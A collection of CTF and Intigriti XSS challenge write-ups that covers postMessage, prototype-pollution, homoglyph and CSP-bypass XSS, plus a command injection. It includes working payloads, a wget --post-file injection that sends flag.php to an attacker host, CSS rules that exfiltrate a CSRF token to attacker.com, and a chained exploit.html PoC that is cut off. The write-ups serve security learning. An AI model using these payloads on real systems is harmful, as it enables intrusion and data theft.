        var win = window.open('https://so-xss.terjanq.me/iframe.php')
        setTimeout(() => {
          win.postMessage({
                identifier: 'abc',
                type: 'render',
                body: `<img src=x onerror=opener.top.postMessage({identifier},'*')>`,
            }, '*');
        }, 2000)
      }
    </script>"></iframe><button onclick="run()">click me 2</button>
    <script>
      var realWin
      var identifier

      function send() {
        if (!realWin) {
          setTimeout(send, 500)
          return
        }

        // give it some time to load
        setTimeout(() => {
          realWin.postMessage({
            identifier,
            type: 'render',
            body: `<img src=x onerror=alert(origin)>`,
          }, '*');
        }, 1000)
        
      }
      onmessage = (e) => {
        if (e.data && e.data.identifier) {
          identifier = e.data.identifier
          console.log('identifier:', identifier)
          send()
        }
      }
      function run() {
        realWin = window.open('https://so-xss.terjanq.me/iframe.php')
      }

    </script>
  </body>
</html> 
```
To resume :

1) Open https://so-xss.terjanq.me/iframe.php from a sandboxed iframe with ```window.open```, so in this way the newly opened window inherit the sandbox flag and his origin will become null.
2) Open https://so-xss.terjanq.me/iframe.php and send the XSS with the stolen identifier, in this way the origin will be ```so-xss.terjanq.me.```

To conclude I would like to thank huli who helped me to write and fix some bugs on the final poc (I suck with javascript syntax lol), I also hope someone will find this writeup useful for learning something new





### File: CTF-Writeups/XMASTCTF-2020/web/FlagChecker/Readme.md

## flag_checker

A source code was provided for this challenge :
```php
<?php
/* flag_checker */
include('flag.php');

if(!isset($_GET['flag'])) {
    highlight_file(__FILE__);
    die();
}

function checkFlag($flag) {
    $example_flag = strtolower('FAKE-X-MAS{d1s_i\$_a_SaMpL3_Fl4g_n0t_Th3_c0Rr3c7_one_karen_l1k3s_HuMu5.0123456789}');
    $valid = true;
    for($i = 0; $i < strlen($flag) && $valid; $i++)
        if(strpos($example_flag, strtolower($flag[$i])) === false) $valid = false;
    return $valid;
}


function getFlag($flag) {
    $command = "wget -q -O - https://kuhi.to/flag/" . $flag;
    $cmd_output = array();
    exec($command, $cmd_output);
    if(count($cmd_output) == 0) {
        echo 'Nope';
    } else {
        echo 'Maybe';
    }
}

$flag  = $_GET['flag'];
if(!checkFlag($flag)) {
    die('That is not a correct flag!');
}

getFlag($flag);
?>
```
From this code we can see it's a oob comand injection , and we can also see that  the function verify only lowercase , so we can add options to our payload with ${IFS}.

First of all I set up a public aws instance and i also installed  nginx.  because the aws instances gives me a public ip , then I listened ngnix on port 80 and used this payload on the challenge : http://challs.xmas.htsp.ro:3001/?flag=${IFS}-${IFS}--post-file${IFS}flag.php${IFS}1.1.1.1(
in place of 1.1.1.1 I put the public ip of the aws instance). Let's see how this payload works.
First of all i used the $IFS variable, which is the “Internal Field Seperator” with default value ```<space><tab><newline>``` also works fine as a separator for commands , in this way the payload is a oob command injection with whitespace bypass , after i used the comand --post-file (this command is used to send the content of a file using wget) because i needed to get out to wget and send the flag.php to my aws istance.

After i went to my nginx and intercepted the traffic with  tcpflow , more specifically with this comand " tcpflow -p -c -i eth0 port 80 " and i could see the content of the flag.php

![xmas1](https://user-images.githubusercontent.com/59454895/103447731-6ac10100-4c8f-11eb-9363-1ebdd340e3ae.PNG)

Flag: X-MAS{s0_fL4g_M4ny_IFS_bb69cd55f5f6}



### File: CTF-Writeups/challenge-0821.intigriti-August_2021/Readme.md

## Intigriti-0821 — XSS Challenge 
![1](https://user-images.githubusercontent.com/59454895/130160182-3de0c889-21db-421d-8444-e412e76a744b.PNG)

## Lets Start

The challenge website had three fields, " The basic XSS ", "The SVG" and " The Polyglot".
Every field had inside the url some parameters composed in this way:
 
```https://challenge-0821.intigriti.io/challenge/cooking.html?recipe=title=The basic XSS&ingredients[]=A script tag&ingredients[]=Some javascript&payload=<script>alert(1)</script>&steps[]=Find target&steps[]=Inject&steps[]=Enjoy```
, everything was encoded in Base64.

First of all i started to look inside the code and i managed to find two interesting function inside the file main.js:
![1](https://user-images.githubusercontent.com/59454895/130160632-9f46a627-5b5c-49a0-bea1-6daf5550de0d.PNG)
This function helped me to understand where the injection point was.
![2](https://user-images.githubusercontent.com/59454895/130160638-6edd3f27-5402-403a-9bd7-aa8ec13ecc87.PNG)

This other function helped me to understand that the name was generated from the cookie, in fact i tried to manipulate the name inside the cookie field from the console by putting a XSS payload and it worked, but it's not valid for the challenge since it's a self xss.

In order to understand how to manipulate the username field from the cookie i started to look inside others javascript files, and i found an interesting javascript file called " jquery-deparam.js " with the following code:
```html
(function(deparam){
    if (typeof require === 'function' && typeof exports === 'object' && typeof module === 'object') {
        try {
            var jquery = require('jquery');
        } catch (e) {
        }
        module.exports = deparam(jquery);
    } else if (typeof define === 'function' && define.amd){
        define(['jquery'], function(jquery){
            return deparam(jquery);
        });
    } else {
        var global;
        try {
          global = (false || eval)('this'); // best cross-browser way to determine global for < ES5
        } catch (e) {
          global = window; // fails only if browser (https://developer.mozilla.org/en-US/docs/Web/Security/CSP/CSP_policy_directives)
        }
        global.deparam = deparam(global.jQuery); // assume jQuery is in global namespace
    }
})(function ($) {
    var deparam = function( params, coerce ) {
        var obj = {},
        coerce_types = { 'true': !0, 'false': !1, 'null': null };

        // If params is an empty string or otherwise falsy, return obj.
        if (!params) {
            return obj;
        }

        // Iterate over all name=value pairs.
        params.replace(/\+/g, ' ').split('&').forEach(function(v){
            var param = v.split( '=' ),
            key = decodeURIComponent( param[0] ),
            val,
            cur = obj,
            i = 0,

            // If key is more complex than 'foo', like 'a[]' or 'a[b][c]', split it
            // into its component parts.
            keys = key.split( '][' ),
            keys_last = keys.length - 1;

            // If the first keys part contains [ and the last ends with ], then []
            // are correctly balanced.
            if ( /\[/.test( keys[0] ) && /\]$/.test( keys[ keys_last ] ) ) {
                // Remove the trailing ] from the last keys part.
                keys[ keys_last ] = keys[ keys_last ].replace( /\]$/, '' );

                // Split first keys part into two parts on the [ and add them back onto
                // the beginning of the keys array.
                keys = keys.shift().split('[').concat( keys );

                keys_last = keys.length - 1;
            } else {
                // Basic 'foo' style key.
                keys_last = 0;
            }

            // Are we dealing with a name=value pair, or just a name?
            if ( param.length === 2 ) {
                val = decodeURIComponent( param[1] );

                // Coerce values.
                if ( coerce ) {
                    val = val && !isNaN(val) && ((+val + '') === val) ? +val        // number
                    : val === 'undefined'                       ? undefined         // undefined
                    : coerce_types[val] !== undefined           ? coerce_types[val] // true, false, null
                    : val;                                                          // string
                }

                if ( keys_last ) {
                    // Complex key, build deep object structure based on a few rules:
                    // * The 'cur' pointer starts at the object top-level.
                    // * [] = array push (n is set to array length), [n] = array if n is
                    //   numeric, otherwise object.
                    // * If at the last keys part, set the value.
                    // * For each keys part, if the current level is undefined create an
                    //   object or array based on the type of the next keys part.
                    // * Move the 'cur' pointer to the next level.
                    // * Rinse & repeat.
                    for ( ; i <= keys_last; i++ ) {
                        key = keys[i] === '' ? cur.length : keys[i];
                        cur = cur[key] = i < keys_last
                        ? cur[key] || ( keys[i+1] && isNaN( keys[i+1] ) ? {} : [] )
                        : val;
                    }

                } else {
                    // Simple key, even simpler rules, since only scalars and shallow
                    // arrays are allowed.

                    if ( Object.prototype.toString.call( obj[key] ) === '[object Array]' ) {
                        // val is already an array, so push on the next value.
                        obj[key].push( val );

                    } else if ( {}.hasOwnProperty.call(obj, key) ) {
                        // val isn't an array, but since a second value has been specified,
                        // convert val into an array.
                        obj[key] = [ obj[key], val ];

                    } else {
                        // val is a scalar.
                        obj[key] = val;
                    }
                }

            } else if ( key ) {
                // No value was defined, so set something meaningful.
                obj[key] = coerce
                ? undefined
                : '';
            }
        });

        return obj;
    };
    if ($) {
      $.prototype.deparam = $.deparam = deparam;
    }
    return deparam;
});
```

I just searched  on google about this library and I found out it's old and vulnerable to prototype pollution ,in fact  a malicious user was allowed to inject properties into Object.prototype with something simple like  ```?__proto__[test]=test```.
Now everything started to make sense because i understood i could manipulate the cookie's username field thanks to the prototype pollution


## What is Prototype Pollution ?

In javascript every Object can be viewed as a key-value pair, with the key being a string, and the value can be anything (similar to “map” or “dictionary” in other languages). Everything that you type in JavaScript (except from primitives) is an Object.

Prototype is an attribute related to Object, it is used as a mechanism that enables JavaScript Objects to inherit features from one to another. Since almost everything in JavaScript is an Object, Prototype is an Object too.
An  Objects Prototype may also have a Prototype, and from it, it can inherit his Prototype or other attributes, and so on. This is referred to as a prototype chain.

Prototype Pollution occurs when an attacker manipulates ``` __proto__ ```, usually by adding a new Prototype into ```__proto__ ```. Since ```__proto__```  exists for every Object, and every Objects inherits the Prototypes from their Prototype, this addition is inherited by all the JavaScript Objects through the prototype chain. Malicious players could take advantage of the ability to insert properties into existing JavaScript code, and execute either Denial of Service attacks, by triggering JavaScript exceptions, or Remote Code Execution, by injecting malicious code. 

To better understand how this vulnerability works, I suggest you read these two articles:
https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/

https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications



## Final Payload

To finish my payload I needed to understand if I could use some gadgets and execute a XSS, while I was looking on google I found this research https://github.com/BlackFan/client-side-prototype-pollution, it was very useful to me because there was a good gagdet example with Google Analytics:

![1](https://user-images.githubusercontent.com/59454895/130161577-95553b61-4846-4b78-a45d-755b40ec3cce.PNG)

Inside the challenge Google Analytics was used, we can see it in the following two screens:

![1](https://user-images.githubusercontent.com/59454895/130162688-c3c68802-1c94-4715-8cb2-a78f7b7f702b.PNG)

![1](https://user-images.githubusercontent.com/59454895/130165680-2c1f9d73-edcc-4c2d-8227-9941a947083c.PNG)



My final payload was:
https://challenge-0821.intigriti.io/challenge/cooking.html?recipe=dGl0bGU9VGhlJTIwYmFzaWMlMjBYU1MmaW5ncmVkaWVudHMlNUIlNUQ9QSUyMHNjcmlwdCUyMHRhZyZpbmdyZWRpZW50cyU1QiU1RD1Tb21lJTIwamF2YXNjcmlwdCZwYXlsb2FkPSUzQ3NjcmlwdCUzRWFsZXJ0KDEpJTNDL3NjcmlwdCUzRSZzdGVwcyU1QiU1RD1GaW5kJTIwdGFyZ2V0JnN0ZXBzJTVCJTVEPUluamVjdCZzdGVwcyU1QiU1RD1FbmpveSZfX3Byb3RvX19bY29va2llTmFtZV09dXNlcm5hbWUlM0Q8aW1nJTIwc3JjJTNEeCUyMG9uZXJyb3IlM0RhbGVydChkb2N1bWVudC5kb21haW4pPiUzQiZfX3Byb3RvX19bY29va2llTmFtZV09dXNlcm5hbWUlM0Q8aW1nJTIwc3JjJTNEeCUyMG9uZXJyb3IlM0RhbGVydChkb2N1bWVudC5kb21haW4pPiUzQiZfX3Byb3RvX19bY29va2llTmFtZV09dXNlcm5hbWUlM0Q8aW1nJTIwc3JjJTNEeCUyMG9uZXJyb3IlM0RhbGVydChkb2N1bWVudC5kb21haW4pPiUzQg==

I just added ```?__proto__[cookieName]=username%3D<img%20src%3Dx%20onerror%3Dalert(document.domain)>%3B``` as GET parameter inside the challenge's url and encoded it in base64,
in this way I polluted the cookieName and injected my XSS payload in the username field inside the cookie. The alert appeared.

![1](https://user-images.githubusercontent.com/59454895/130163257-8278d8a9-5509-441a-b064-b2e9fd2bda64.PNG)
































### File: CTF-Writeups/challenge-1221.intigriti.io-XMAS/Readme.md

![xmas](https://user-images.githubusercontent.com/59454895/147423668-176bed51-66d4-4cb1-8e38-8670dc87995c.PNG)
## Let's start
The challenge comes with an input field and a parameter called " Stay open " to avoid repeating an animation, first of all I tried to insert a simple payload like <script>alert(document.domain)</script> to understand where the starting point was.

![xss2](https://user-images.githubusercontent.com/59454895/147423813-7a3e8cf9-6ac7-41c0-9c9c-07d6921a0cdf.png)
From the screen I showed you above, you can see two pieces of information, first of all the content is reflected inside an html comment.
This is really important because with a simple payload like ``` --><script>alert(document.domain)</script>``` we can escape from the comment and execute our xss payload, 
but there is a problem, as you can see from the screen  the characters ```<``` and ```>``` are encoded.

At this point I tried to think of various bypasses until I came up with an idea based on a previously played ctf.

## Homoglyph characters
Homoglyph are character that look alike but are not the same, so it's possible to use characters that looks the same but are interpreted 
differently from the server, here is an example:

![xss2](https://user-images.githubusercontent.com/59454895/147424278-b465ff5a-24cd-4a12-8843-67b5fa89f4b7.png)

This is how my input got interpreted, but let's see the content inside the html comment.

![xss3](https://user-images.githubusercontent.com/59454895/147424325-9d3b23c2-ed52-433d-bb4d-fe4dbf20a305.PNG)

As you can see, especially from the latest D. The content looks the same but is interpreted differently, 
this is really important because we can use this type of characters to bypass the control on ```<``` and ```>```

## Final Payload

To build the final payload I simply used Homoglyph characters regarding the ```<``` and the ```>```, in this way I was able to close the html comment and escape in order to execute XSS.

![xss4](https://user-images.githubusercontent.com/59454895/147424604-cea7b20b-1f05-4167-9beb-f5743c3dfd41.PNG)

To be sure, I url encoded the whole payload.

https://challenge-1221.intigriti.io/challenge/index.php?payload=--%EF%B9%A5%EF%B9%A4script%EF%B9%A5alert(document.domain)%EF%B9%A4/script%EF%B9%A5

Just to be clear, clicking the link will not execute the xss, but you will need to enter ``` --﹥﹤script﹥alert(document.domain)﹤/script﹥  ``` inside the input field ( we will see after how to not make this case a self-xss )

![comment2](https://user-images.githubusercontent.com/59454895/147426340-b566f6b1-d134-46f7-8e43-61a93f1d98aa.PNG)


As you can see, I was able to get out of the Html comment, and execute my payload.


## Final Poc

Now that we know how to execute the xss it's not over, in fact the scenario described is that of a Self-XSS, which is no good.
To avoid this problem, I wrote this simple POC:

```html

<html>
  <body>
    <a href="https://challenge-1221.intigriti.io/challenge/index.php?payload=xss" referrerpolicy="unsafe-url">Click here </a>
  </body>
</html>


```

The only interesting part is the ```referrerpolicy="unsafe-url"``` parameter that is needed to send the origin, path, and query string when performing any request, regardless of security.
This means that this policy will leak potentially-private information (in this case our payload) from HTTPS resource URLs to insecure origins, without this parameter it would not be possible to populate the referrer header from an external origin and execute XSS.


The last step is to host our code and insert the payload described above in the url:

https://mydomain/xmasxss.html?payload=--%EF%B9%A5%EF%B9%A4script%EF%B9%A5alert(document.domain)%EF%B9%A4/script%EF%B9%A5

Here is my working POC:
https://brunohalltari.github.io/PoC_Di_Bruno_Modificato/index.html?payload=--%EF%B9%A5%EF%B9%A4script%EF%B9%A5alert(document.domain)%EF%B9%A4/script%EF%B9%A5







### File: CTF-Writeups/https:/challenge-0822.intigriti.io/Readme.md

# Challenge
![](https://i.imgur.com/rXYZuMY.png)

## XSS Sink

In `preview.php` there are two interesting parameters that can be manipulated to achieve xss:

```php
$name = htmlspecialchars($name);
$desc = htmlspecialchars($desc);

$desc = preg_replace('/(https?:\/\/www\.youtube\.com\/embed\/[^\s]*)/', '<iframe src="$1"></iframe>', $desc);

$desc = preg_replace('/(https?:\/\/[^\s]*\.(png|jpg|gif))/', '<img src="$1">', $desc);
```
At first glance it might seem like a dead end as `htmlspecialchars()` is used on the parameters, so every special character will be converted to HTML entities and xss won't be possible.

If you look carefully the variable `desc` goes through two different regular expressions, because there are two regex, one in charge to put links inside an iframe, and the other one in charge to put png,jgp and gif stuff inside an `img` tag , all of this  after `htmlspecialchars()` is performed.

### Nested conditions
Nested condition is when one payload is processed by two different parsers, which, with some manipulations, will make the parser return broken HTML code with our user input migrating from an HTML attribute value to an HTML attribute name.

Let's make an example:
If we use `https://www.youtube.com/embed/test=yo.jpg` as an input, after the first replacement, it becomes:
```js 
<iframe src="https://www.youtube.com/embed/test=yo.jpg"></iframe>
```
The link ends with `.jpg` so after it goes through the second regex, this is the final result:
``` html
<iframe src="<img src="https://www.youtube.com/embed/test=yo.jpg">"></iframe>
```
Thanks to the nested conditions, our link is first of all incorporated inside and iframe tag, and after is incorporated inside and img tag too.
Now the double quote of the `src` attribute have been closed and `test=` is considered an HTML name attribute of the iframe now and not the HTML attribue value anymore. It mean that we can inject a new attribute that can specifies HTML content that will be shown in the inline frame, like `srcdoc`, in order to put some malicious HTML content.

It works because even if `htmlspecialchars` will perform the encoding, the context is going to change, now our HTML malicious code is the content of the attribute, and  in the HTML context the attribute content will be decoded and our payload executed.
```html
https://www.youtube.com/embed/srcdoc=<h1>test</h1>.jpg
```
![](https://i.imgur.com/Y5ChAJT.png)

We still can't perform XSS because there is a CSP to bypass.

## CSP Bypass
Below you can find the rules of the CSP:

```php
<?php
  header("Content-Security-Policy: ".
      "default-src 'self'; " .
      "img-src http: https:; " .
      "style-src 'unsafe-inline' http: https:; " .
      "object-src 'none';" .
      "base-uri 'none';" .
      "font-src http: https:;".
      "frame-src https://www.youtube.com/;".
      "script-src 'self' https://cdnjs.cloudflare.com/ajax/libs/;");
?>
```
Here the csp bypass should be clear, `https://cdnjs.cloudflare.com/ajax/libs` is inside the allow-list, so we can use the some angular gadget in order to execute Javascript.
There is a very well-know gadget that is used in almost every CTF (doesn't require user-interaction) when it comes to this types of challenges:
```js
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
  {{$on.curry.call().alert(1)}}
</div>
```
But in this challenge it won't work, we blocked this gadget with the following lines of codes (we alse did some other checks to be sure that couldn't  be possible to bypass this blacklist):

```php
$dangerous_words = ['eval', 'setTimeout', 'setInterval', 'Function', 'constructor', 'proto', 'on', '%', '&', '#', '?', '\\'];

foreach ($dangerous_words as $word) {
  if (stripos($desc, $word) !== false){
    header("Location: app.php#msg=dangerous word detected!");
    die();
  }
}
```
It means that the player needs to find a new gadget, but before let's see why `prototype.js` was needed, in this way we can understand how to find a new gadget.
prototype.js is needed because it adds a few methods to the prototype, like the following one:

```js
function curry() {
  if (!arguments.length) return this;
  var __method = this, args = slice.call(arguments, 0);
  return function() {
    var a = merge(args, arguments);
    return __method.apply(this, a);
  }
}
```
From `if (!arguments.length) return this;` we know that if we perform `function.call()` without providing an argument, it will return `this`, which in this context is going to be `window` in non-strict mode, (in javascript `window` is the global object.)
It works because if `call()`, which is built-in method, <strong>is performed withouth an argument and the function is not in strict mode, null and undefined will be replaced with the global object.</strong>

For example, if we perform obj.hello.call(undefined) the function is going to return `window`.
It is also worth to say that the Angular Sandbox won't let you access directly the `window` object, so we need to access the protoype, and then from the prototype we need to find a function that can return the `window` object.
This is a difficult concept to explain if you are not familiar with javascript, here you can find the documentation about this behavior:
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/call

Now that we know understand this concept we also understand why protoype.js was usefull , it was useful because`any_function.curry.call()` will return `window` in non-strict mode,  and if we have access to the global object we can bypass the Angular sandbox.

For this challenge we decided to use `mootols` library, with a script to check all the methods added to the prototype that return `window` after the library is loaded:

```html
<!DOCTYPE html>

<html lang="en">
<head>
  <meta charset="utf-8">
  <!-- get the prototype before the library is loaded -->
  <script>
    function getPrototypeFunctions(prototype) {
      return Object.getOwnPropertyNames(prototype)
    }
    var protos = {
      array: getPrototypeFunctions(Array.prototype),
      string: getPrototypeFunctions(String.prototype),
      number: getPrototypeFunctions(Number.prototype),
      object: getPrototypeFunctions(Object.prototype),
      function: getPrototypeFunctions(Function.prototype)
    }
  </script>
</head>
<body>
 <!-- load the library -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
  <!-- get the prototype after the library is loaded -->
  <script>

    var newProtos = {
      array: getPrototypeFunctions(Array.prototype),
      string: getPrototypeFunctions(String.prototype),
      number: getPrototypeFunctions(Number.prototype),
      object: getPrototypeFunctions(Object.prototype),
      function: getPrototypeFunctions(Function.prototype)
    }

    let result = {
      prototypeFunctions: [],
      functionsReturnWindow: []
    }

    function check() {
      checkPrototype('array', 'Array.prototype', Array.prototype)
      checkPrototype('string', 'String.prototype', String.prototype)
      checkPrototype('number', 'Number.prototype', Number.prototype)
      checkPrototype('object', 'Object.prototype', Object.prototype)
      checkPrototype('function', 'Function.prototype', Function.prototype)

      return result
    }

    function checkPrototype(name, prototypeName, prototype) {
      const oldFuncs = protos[name]
      const newFuncs = newProtos[name]
      for(let fnName of newFuncs) {
        if (!oldFuncs.includes(fnName)) {
          const fullName = prototypeName + '.' + fnName
          result.prototypeFunctions.push(fullName)
          try {
            //check if the function return window 
            if (prototype[fnName].call() === window) {
              result.functionsReturnWindow.push(fullName)
            }
          } catch(err) {

          }
        }
      }
    }

    console.log(check())
  </script>
</body>

</html>
```
Result:

![](https://i.imgur.com/wS1Tecm.png)

Now we can use this gadget to achieve XSS:
```js
<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
  {{[].empty.call().alert([].empty.call().document.domain)}}
</div>
```

This is the final payload to execute XSS on the page:

```
https://www.youtube.com/embed/srcdoc=<script/src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script><script/src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script><div/ng-app/ng-csp>{{[].empty.call().alert([].empty.call().document.domain)}}</div>.png
```

But this is not the end of the challenge because this is considered a Self-XSS and it is not allowed, in order to weaponize this type of attack we need to chain it with a CSRF attack.

## CSRF Token leak via XS-Leak
The CSRF token is successfully validated server-side, but if we find a way to Inject CSS then we can use the CSS Injection to exfiltrare the CSRF Token.
We can find the CSRF token two times inside the file `app.php`:
```html
<head>
    <meta name="csrf-token" content="<?= $csrf_token ?>"> 
</head>
```
And:
```html
<div>
  <input type="hidden" name="csrf-token" value="<?= $csrf_token ?>" />
</div>
```


CSS injection token exfiltration technique relies on a feature of CSS called Attribute Selectors. Attribute selectors allow a developer to specify that a particular style should only apply to an element if an attribute of that element meets the condition indicated by the selector, it means we can set-up a `cssInjectionServerUrl` that performs the following logic:

```css
<style>
  head, meta[name=csrf-token] {
    display: block;
  }
input[name=csrf-token][value^=a]{
    background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf-token][value^=b]{
    background-image: url(https://attacker.com/exfil/b);
}
input[name=csrf-token][value^=c]{
    background-image: url(https://attacker.com/exfil/c);   
}
</style>
```
In this example we are telling to the browser that “if the CSRF token starts with an `a` then set the background-image to be the image found at `https://attacker.com/exfil/a`. Then we repeat this rule for every possible character.

```
head, meta[name=csrf-token] {
    display: block;
  }

```
This part is also very useful, we need this piece of code because the CSRF Token needs to be leaked from `<meta>` tag, `display: block;` is in charge to make HTML tags that are normally hidden to be rendered, in this way the css exploit can be applied to our `<meta>` tag too (because `<meta>` is inside the `<head>` tag, so without this last piece of code the CSS exploit is not going to apply on the csrf token).
We can't exfiltrate the CRSF Token from the `<input>` tag because it is hidden and it is also inside the `<div>` tag.

Actually we can inject some CSS inide the msg parameter that is reachable in the  route `/app.php#msg=`

After that our `cssInjectionServerUrl` has been set, we can insert the following code inside the`msg` parameter:
```css
<style>
          @import url('${cssInjectionServerUrl}/start?id=${id}&len=csrf-token-length')
</style>`
```
We can't perform XSS here because the `msg` parameter is filtered out by the last version of DomPurify ( as you can see from the code below), but `<style>` is not consider harmful and it’s allowed by default in DOMPurify.

```js
function showMessage(message, options) {
  const getTimeout = options.timeout || (() => 1000)
  const container = options.container || document.querySelector('body')

  const modal = document.createElement('div')
  modal.id = 'messageModal'
  modal.innerHTML = DOMPurify.sanitize(message)
  container.appendChild(modal)
  history.replaceState(null, null, ' ')

  setTimeout(() => {
    container.removeChild(modal)
  }, getTimeout())
}
```


There is another problem now, our injected element will be removed after  `timeout` is called, the default timeout is `600ms` as you can see in  following code:

```js
function start() {
  const message = decodeURIComponent(location.hash.replace('#msg=', ''))
  if (!message.length) return
  const options = {}
  if (document.domain.match(/testing/)) {
    options['production'] = false
  } else {
    options['production'] = true
    options['timeout'] = () => Math.random()*300 + 300
  }
  showMessage(message, {
    container: document.querySelector('body'),
    ...options
  })
}
```
We can’t steal all the 32-characters of the CSRF token in 600ms, unless we find a way to increase the timeout.

In fact if you have played our challenge you will have noticed that the message in which it is possible to insert CSS code disappears very quickly, as shown by the code before.

Now, look at the following code carefully:

```js
if (document.domain.match(/testing/)) {
  options['production'] = false
} else {
  options['production'] = true
  options['timeout'] = () => Math.random()*300 + 300
}
```
If the condition `if(document.domain.match(/testing/))` is false, the timeout will be set and it cannot be changed. If the condition is true the timeout won't be set, so if we find a prototype pollution then we can pollute Object.prototype.timeout to manipulate the timeout.

How can we make this condition true?

## DOM Clobbering

I think everyone knows how to clobber `window` properties, if you don't you can learn it here: https://portswigger.net/web-security/dom-based/dom-clobbering.

With DOM Clobbering is also possible to clobber `document` properties with some tags, like the `<img>` tag, let's make an example:

![](https://i.imgur.com/3Nn3xJp.png)

You can see how `document.URL` is returning a string with the url of the page, but after I put `<img name=URL>` the img element will be returned instaed of the string, let's make another example:

![](https://i.imgur.com/SgBmupO.png)

As you can see in this screenshot, if we have an img tag on the page with the name attribute set to “try”, “document.try” now refers to this HTML element.
As you might now have guessed, we can use this technique to override the “document.domain” variable with an HTML element.

in `app.php` there is also a vulnerability in the following lines of code:

```html
<input id="nameField" type="text" name="name" value="<?= $_SESSION['name']; ?>" maxlength="20">
```
Here there is a clear HTML Injection inside the name field, but it is not possible to achieve XSS from this injection point because there is a length check for this parameter:


```php
if (strlen($name) >= 20) {
  die('name too long');
}
```
Given the strict CSP is not possible to execute XSS with less that 20 characters, but we can inject `"><img name=domain>` inside the name field, now `document.domain` is a HTML element so it will be also a DOM element, it means that `document.domain.match` will throw an error because there will be no `match` method in DOM after the DOM Clobbering is performed.

In JavaScript, when a given method is <strong>not found</strong>, the JS engine will keep looking one level up to check it’s prototype until the prototype is `null`, it mean that if we have a protoype pollution we can pollute `Object.prototype.match`.

## Prototype Pollution

JavaScript is a prototype-based object-oriented programming language. Each object is linked to a “prototype”. for example. if we invoke the `toString` method on an object, JavaScript will first check to see if we explicitly defined the method for the given object. If we haven’t, it will look for its definition on the object’s prototype, but what if we find a way to insert our malicious content inside the Object prototype ?

There is a Prototype Pollution inside `initTheme`:

```js
function initTheme() {
  if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
    isDarkMode = true
  }

  fetch("theme.php")
    .then((res) => res.json())
    .then((serverTheme) => {
      theme = {
        primary: {},
        secondary: {}
      }

      // look carefully at the following loop
      for(let themeName in serverTheme) {
        const currentTheme = theme[themeName]
        const currentServerTheme = serverTheme[themeName]

        for(let item in currentServerTheme) {
          currentTheme[item] = () => isDarkMode ? currentServerTheme[item].dark : currentServerTheme[item].light
        }
      }

      const themeDiv = document.querySelector('.theme-text')
      themeDiv.innerText = `Primary - Text: ${theme?.primary?.text()}, Background: ${theme?.primary?.bg()}
        Secondary - Text: ${theme?.secondary?.text()}, Background: ${theme?.secondary?.bg()}
      `
      start()
    })
}

```
This type of vulnerability is often associated with operations such as `merge()`, `clone()` ecc ecc..., or when a query string is parsed.
In fact there is another pattern that can lead to prototype pollution, if `obj[a][b]=value` is present it can be vulnerable if you can control both `a` and `value`, as an attacker we can set `a` to `__proto__` and the property with the name defined by `b` will be defined on all existing objects of the application with the value defined by `value`.
Ehi, we can find this pattern inside the loop in the code above!

`initTheme` is in charge to update the themes, so in order to exploit this vulnerability we can update a theme from the website and provide the following content:

```json
{
  "__proto__":{
    "timeout":{
      "dark":"99999","light":"99999"
    },
    "match":{
      "dark":"1", "light":"1"
    }
  }
}
```

After the theme is loaded, `Object.prototype.match` will return 1 which means true, so after the DOM Clobbering is performed and javascript will look into the prototype, it will find out that `Object.prototype.timeout` will be true, in this way `document.domain.match(/testing/)` will not be false anymore.

Now that the condition is true, we also polluted `Object.prototype.timeout` , it will become a function that always returns "99999", in this way we have more time to perform our CSS Injection to exfiltrare the CSRF token and not 600ms anymore.

## Summary:

1. Log-in with the name `"><img name=domain>` to perform DOM clobbering in order to make the JS engine look into the proto chain.
2. Update theme and perform prototype pollution in order to make `Object.prototype.match` true and manipulate `Object.prototype.timeout`
3. Exiltrate the CSRF token via CSS injection
4. Execute the CSRF attack in order to submit the payload with nested conditions XSS + CSP bypass. 

## Final PoC:
Let's prepare `exploit.html`:

```html
<html>
<head>
    <script>
        const URL = 'https://challenge-0822.intigriti.io/challenge';
        const webhook = location.host;
        // prepare the id
        const ID = Math.floor(Math.random() * Math.pow(2, 32)).toString(16).padStart(8, '0');

        const sleep = (ms) => new Promise(r => setTimeout(r, ms));
        let w;

        function login(name) {
            let route = URL + '/login.php?name=';
            route += encodeURIComponent(name);
            w = window.open(route, 'window');
            return w;
        }
    // perform the proto pollution
        async function prototype_pollution() {
            w.location.href = '/empty';
            await sleep(2000);
            w.document.body.innerHTML = `
            <form id=f action="https://challenge-0822.intigriti.io/challenge/theme.php" method="POST" enctype="text/plain">
                <input id=i type="hidden" name='' value='' />
            </form>
            `;
            w.i.name = `
            {
                "primary": {
                    "text": {
                        "dark": "#1337",
                        "light": "#1337"
                    },
                    "bg": {
                        "dark": "#1337",
                        "light": "#1337"
                    }
                },
                "__proto__":{
                    "timeout":{
                        "dark":99999,
                        "light":99999
                    },
                    "match":{
                        "dark":1,
                        "light":1
                    }
                },
                "secondary": {
                    "text": {
                        "dark": "#1337",
                        "light": "#1337"
                    },
                    "bg": {
                        "dark": "#1337",
                        "light": "#1337"
                    },
                    "x":"
            `.replace(/\s/g, '')
            w.i.value = '"}}';
            w.f.submit();
            return w;
        }

        async function xss(token){
            w.location.href = '/empty';
            await sleep(2000);
            w.document.body.innerHTML = `
            <form id=f action="https://challenge-0822.intigriti.io/challenge/preview.php" method="POST">
                <input id=c type="hidden" name="csrf-token" value="" />
                <input id=n type="hidden" name="name" value="" />
                <input id=d type="hidden" name="desc" value="" />
            </form>
            `;
            w.c.value = token;
            w.n.value = 'test';
            w.d.value = `
